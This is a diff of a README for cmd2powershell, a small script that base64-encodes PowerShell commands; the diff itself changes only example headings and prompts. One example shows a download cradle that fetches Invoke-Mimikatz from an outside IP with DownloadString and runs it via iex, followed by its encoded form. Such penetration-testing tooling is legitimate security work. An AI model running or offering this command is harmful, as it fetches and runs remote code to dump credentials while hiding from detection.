@@ -13,18 +13,18 @@ optional arguments:
   -s, --stdin  Read from stdin
 ```
 
-Examples:
+Example 1:
 
 ```
-byt3bl33d3r@holeechit:~/cmd2powershell$ python cmd2powershell.py 'Get-PSDrives'
+byt3bl33d3r@holeechit:~$ python cmd2powershell.py 'Get-PSDrives'
 RwBlAHQALQBQAFMARAByAGkAdgBlAA==
 ```
 
-
+Example 2:
 ```
 byt3bl33d3r@holeechit:~$ cat command 
 iex (New-Object Net.WebClient).DownloadString("http://192.168.10.6:80/Invoke-Mimikatz.ps1"); invoke-mimikatz
 
-byt3bl33d3r@holeechit:~/cmd2powershell$ cat command | python cmd2powershell.py -s
+byt3bl33d3r@holeechit:~$ cat command | python cmd2powershell.py -s
 aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAMAAuADYAOgA4ADAALwBJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAuAHAAcwAxACIAKQA7ACAAaQBuAHYAbwBrAGUALQBtAGkAbQBpAGsAYQB0AHoACgA=
 ```
